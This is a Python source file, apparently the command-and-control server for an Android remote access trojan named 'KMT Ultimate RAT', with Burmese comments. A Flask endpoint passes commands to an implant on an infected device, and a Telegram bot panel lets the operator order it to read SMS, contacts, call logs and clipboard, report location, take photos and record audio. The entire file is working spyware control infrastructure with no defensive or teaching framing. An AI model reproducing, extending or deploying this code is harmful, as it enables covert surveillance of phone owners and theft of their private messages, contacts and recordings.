import os
import threading
import telebot
from flask import Flask

# 1. Flask App (Render အတွက်)
app = Flask(__name__)

# လက်ရှိ Command ကို သိမ်းဆည်းရန် Variable (Default က IDLE)
current_command = "IDLE"

@app.route('/')
def home():
    return "KMT Ultimate RAT Bot is running live!"

# App ဘက်မှ အမိန့်လာယူမည့် API Endpoint
@app.route('/get_command')
def get_command():
    global current_command
    return current_command

# 2. Telegram Setup
TOKEN = os.environ.get('BOT_TOKEN')
bot = telebot.TeleBot(TOKEN)

# 3. Telegram Control Panel
@bot.message_handler(commands=['start', 'panel'])
def send_control_panel(message):
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    btn_info = telebot.types.InlineKeyboardButton("📱 Device Info", callback_data="cmd_info")
    btn_sms = telebot.types.InlineKeyboardButton("✉️ Read SMS", callback_data="cmd_sms")
    btn_contacts = telebot.types.InlineKeyboardButton("📇 Get Contacts", callback_data="cmd_contacts")
    btn_cam = telebot.types.InlineKeyboardButton("📸 Take Photo", callback_data="cmd_cam")
    btn_loc = telebot.types.InlineKeyboardButton("📍 Get Location", callback_data="cmd_loc")
    btn_clipboard = telebot.types.InlineKeyboardButton("📋 Clipboard", callback_data="cmd_clipboard")
    btn_calls = telebot.types.InlineKeyboardButton("📞 Call Logs", callback_data="cmd_calls")
    btn_mic = telebot.types.InlineKeyboardButton("🎤 Record Audio", callback_data="cmd_mic")
    btn_clear = telebot.types.InlineKeyboardButton("🧹 Clear / IDLE", callback_data="cmd_clear")
    
    markup.add(btn_info, btn_sms, btn_contacts, btn_cam, btn_loc, btn_clipboard, btn_calls, btn_mic, btn_clear)
    
    bot.send_message(
        message.chat.id, 
        "🔥 *KMT ULTIMATE RAT CONTROL PANEL* 🔥\n\nလိုအပ်သော အမိန့် (Command) ကို ရွေးချယ်ပါ:", 
        reply_markup=markup,
        parse_mode="Markdown"
    )

# 4. Callback Queries (ခလုတ်နှိပ်သည့်အခါ Command ပြောင်းရန်)
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global current_command
    chat_id = call.message.chat.id
    
    commands_map = {
        "cmd_info": ("CMD: GET_INFO", "📱 Device Info တောင်းဆိုသည့် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_sms": ("CMD: READ_SMS", "✉️ SMS ဖတ်ရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_contacts": ("CMD: GET_CONTACTS", "📇 Contacts ယူရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_cam": ("CMD: TAKE_PHOTO", "📸 ဓာတ်ပုံရိုက်ရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_loc": ("CMD: GET_LOCATION", "📍 တည်နေရာယူရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_clipboard": ("CMD: GET_CLIPBOARD", "📋 Clipboard စာသား ယူရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_calls": ("CMD: GET_CALLS", "📞 Call Logs မှတ်တမ်း ယူရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_mic": ("CMD: RECORD_AUDIO", "🎤 အသံဖမ်းရန် အမိန့် ပို့ပြီးပါပြီ။"),
        "cmd_clear": ("IDLE", "🧹 Command ကို IDLE သို့ ပြောင်းလိုက်ပါပြီ။")
    }
    
    if call.data in commands_map:
        cmd_text, msg_text = commands_map[call.data]
        current_command = cmd_text  # Render Variable ကို ပြောင်းလဲခြင်း
        bot.answer_callback_query(call.id, "Command Updated!")
        bot.send_message(chat_id, msg_text)

# 5. Background Thread & Flask Run
def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    t = threading.Thread(target=run_bot)
    t.start()
    
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
